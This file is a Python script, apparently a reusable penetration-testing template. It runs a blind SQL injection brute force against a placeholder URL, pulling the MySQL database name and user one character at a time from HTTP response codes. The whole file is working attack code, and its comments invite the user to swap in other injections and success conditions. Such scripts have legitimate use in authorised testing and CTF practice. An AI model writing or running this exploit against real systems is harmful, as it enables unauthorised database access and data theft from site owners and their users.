from pwn import *
import requests
import time
import sys

# Constants
URL = "http://vulnerableDomain.com/path/to/file?vulnerable_parameter=value"
COOKIES = {"Session-Cookies": "<Cookie>"}
HEADERS = {"Header_1": "value", "Header_2": "value"}
ASCII = range (33, 127) # All ASCII Dec values for valid characters

def sqli():

    # First progress bar
    p1 = log.progress("SQLI")
    p1.status("Starting Brute Force Attack...")
    time.sleep(1.5)
    # Second progress bar
    p2 = log.progress("Data")
    data = ""

    # Place loop
    bad_count = 0
    for place in range(1,100):

        # Error validation
        if bad_count == 94:
            print("[+] Attack Finished :)")
            sys.exit(0)
        # Reset the bad count for each new character
        bad_count = 0 

        # Character loop
        for char in ASCII:

            # Here change the injection as needed, this is an example of a MySQL injection to extract DB_name:User_name
            injection = f"' and if((select( select ascii(substring(group_concat(database(), \":\", user()),{place},1)) from pages where 1=1)={char}),1,0) -- -"
            p1.status(injection)
            r = requests.get(URL + injection, headers=HEADERS, cookies=COOKIES)
            time.sleep(0.005)

            # Here change the condition as needed
            if r.status_code == 200:
                data = data + chr(char)
                p2.status(data)
                break
            else:
                bad_count += 1

if __name__ == '__main__':
    try:
        sqli()
    except: 
        print("[!] Process Stopped...")
        sys.exit(1)